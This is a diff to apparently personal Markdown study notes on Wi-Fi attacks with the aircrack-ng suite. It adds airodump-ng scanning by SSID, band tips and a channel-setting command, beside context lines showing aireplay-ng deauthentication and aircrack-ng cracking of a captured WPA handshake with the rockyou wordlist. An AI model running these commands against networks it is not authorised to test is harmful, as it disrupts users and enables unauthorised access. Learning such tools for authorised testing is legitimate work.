@@ -60,6 +60,22 @@
 
 `sudo airodump-ng wlan0mon --write capture` — Save captured packets to files.
 
+> [!important]  Important command: 
+
+```Bash
+sudo airodump-ng --essid "MyNetwork" [interface]
+```
+
+> Use **'--essid'** to scan network by **'SSID'**
+
+---
+
+> [!question] What band to use?
+
+> [!fire] Use *'a'* or *'ac'* to scan on *~5GHz* frequency
+
+>[!fire] Use *'b'* or *'bg'* to scan on *~2.4GHz* frequency
+
 ---
 
 ## 🎯 Capture One Wi-Fi Network
@@ -72,6 +88,12 @@
 
 ## 📤 Send Deauthentication Packets
 
+> [!important] Important command
+
+```Bash
+sudo iwconfig [inteface] channel [channel]
+```
+
 `sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon`
 
 ➡️ Send **10 deauthentication packets** to the selected access point.
@@ -80,7 +102,9 @@
 
 ## 🔑 Test a Captured Handshake
 
-`sudo aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt`
+```Bash 
+sudo aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt
+```
 
 ➡️ Test passwords from the **rockyou.txt** wordlist against the captured WPA/WPA2 handshake.
 
